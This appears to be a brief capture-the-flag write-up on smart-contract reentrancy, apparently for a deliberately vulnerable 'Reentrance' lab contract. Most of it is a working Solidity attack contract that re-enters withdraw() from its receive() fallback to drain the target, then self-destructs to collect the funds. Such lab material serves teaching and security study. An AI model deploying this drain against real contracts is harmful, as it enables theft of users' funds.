# Reentrancy

Smart contracts can run code when receiving funds, which means that a transaction can trigger re-entrancy. The vulnerable contract only deducts an account's funds after a transaction so we use what we've learned to skip that altogether.

```javascript
// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.7.0 <0.9.0;

contract Reentrance {

    function donate(address _to) public payable {}
    function withdraw(uint _amount) public {}
}

contract DoubleDipping {
    
    Reentrance reentrance;
    
    constructor(address _instance) {
        reentrance = Reentrance(_instance);
    }
    
    function dip() public payable {
        reentrance.donate{value: msg.value}(address(this));
        reentrance.withdraw(1 ether);
    }
    
    receive() external payable {
        // Double dip
        if (address(reentrance).balance >= 1 ether) {
            reentrance.withdraw(1 ether);
        }
    }
    
    function refund() public {
        selfdestruct(payable(msg.sender));
    }
}
```